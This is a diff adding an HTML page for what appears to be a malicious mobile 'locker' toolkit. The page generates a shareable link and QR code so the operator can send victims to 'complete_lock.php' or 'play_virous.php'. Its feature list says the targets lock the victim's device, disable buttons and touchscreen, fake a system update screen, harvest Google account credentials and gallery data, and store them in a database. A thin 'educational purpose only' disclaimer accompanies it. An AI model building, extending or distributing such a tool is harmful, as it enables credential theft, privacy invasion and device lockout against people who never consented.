@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Share Mobile Locker Link</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #e74c3c;
+            text-align: center;
+        }
+        .qr-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+        .link-container {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #f8f8f8;
+            border-radius: 5px;
+            word-break: break-all;
+        }
+        .warning {
+            margin-top: 30px;
+            padding: 15px;
+            background-color: #ffe6e6;
+            border-left: 4px solid #e74c3c;
+            border-radius: 4px;
+        }
+        .warning h3 {
+            margin-top: 0;
+            color: #e74c3c;
+        }
+        .copy-btn {
+            display: block;
+            margin: 20px auto;
+            padding: 10px 20px;
+            background-color: #3498db;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .copy-btn:hover {
+            background-color: #2980b9;
+        }
+        .feature-list {
+            margin: 20px 0;
+        }
+        .feature-list li {
+            margin-bottom: 8px;
+        }
+        .locker-type {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .standard {
+            background-color: #e8f4fd;
+            color: #3498db;
+        }
+        .complete {
+            background-color: #ffe6e6;
+            color: #e74c3c;
+        }
+        .back-btn {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 8px 15px;
+            background-color: #7f8c8d;
+            color: white;
+            text-decoration: none;
+            border-radius: 4px;
+        }
+        .back-btn:hover {
+            background-color: #6c7a7d;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Mobile Device Locker Link</h1>
+        
+        <div id="lockerTypeDisplay" class="locker-type"></div>
+        
+        <p>Share this link with anyone whose mobile device you want to lock and collect data from:</p>
+        
+        <div class="qr-container">
+            <h2>QR Code</h2>
+            <div id="qrcode"></div>
+        </div>
+        
+        <h2>Direct Link</h2>
+        <div class="link-container" id="link-display"></div>
+        
+        <button class="copy-btn" onclick="copyLink()">Copy Link</button>
+        
+        <div class="warning">
+            <h3>⚠️ Warning</h3>
+            <p>This link has the following capabilities:</p>
+            <ul class="feature-list" id="feature-list">
+                <!-- Features will be populated by JavaScript -->
+            </ul>
+            <p><strong>Educational Purpose Only:</strong> This tool is for educational and authorized testing purposes only.</p>
+        </div>
+        
+        <a href="index.php" class="back-btn">← Back to Main Page</a>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/qrcode.js@1.0.0/qrcode.min.js"></script>
+    <script>
+        // Get URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const lockerType = urlParams.get('type') === 'complete' ? 'complete' : 'standard';
+        
+        // Get the current URL without the filename
+        const baseUrl = window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1);
+        let lockUrl;
+        
+        // Set locker type display
+        const lockerTypeDisplay = document.getElementById('lockerTypeDisplay');
+        const featureList = document.getElementById('feature-list');
+        
+        if (lockerType === 'complete') {
+            lockUrl = baseUrl + 'complete_lock.php';
+            lockerTypeDisplay.textContent = 'Complete Locker (Advanced)';
+            lockerTypeDisplay.className = 'locker-type complete';
+            
+            // Set features for complete locker
+            featureList.innerHTML = `
+                <li>Completely disables all buttons (power, volume, back, home, etc.)</li>
+                <li>Disables touchscreen functionality</li>
+                <li>Collects Google account credentials</li>
+                <li>Accesses and collects gallery data</li>
+                <li>Stores all collected data in a database</li>
+            `;
+        } else {
+            lockUrl = baseUrl + 'play_virous.php';
+            lockerTypeDisplay.textContent = 'Standard Locker (Basic)';
+            lockerTypeDisplay.className = 'locker-type standard';
+            
+            // Set features for standard locker
+            featureList.innerHTML = `
+                <li>Basic screen locking functionality</li>
+                <li>Simulates system update screen</li>
+                <li>Collects Google account credentials</li>
+                <li>Attempts to access gallery data</li>
+                <li>Stores collected data in a database</li>
+            `;
+        }
+        
+        // Display the link
+        document.getElementById('link-display').textContent = lockUrl;
+        
+        // Generate QR code
+        new QRCode(document.getElementById("qrcode"), {
+            text: lockUrl,
+            width: 200,
+            height: 200,
+            colorDark: "#000000",
+            colorLight: "#ffffff",
+            correctLevel: QRCode.CorrectLevel.H
+        });
+        
+        // Function to copy link to clipboard
+        function copyLink() {
+            const el = document.createElement('textarea');
+            el.value = lockUrl;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+            
+            alert('Link copied to clipboard!');
+        }
+    </script>
+</body>
+</html>
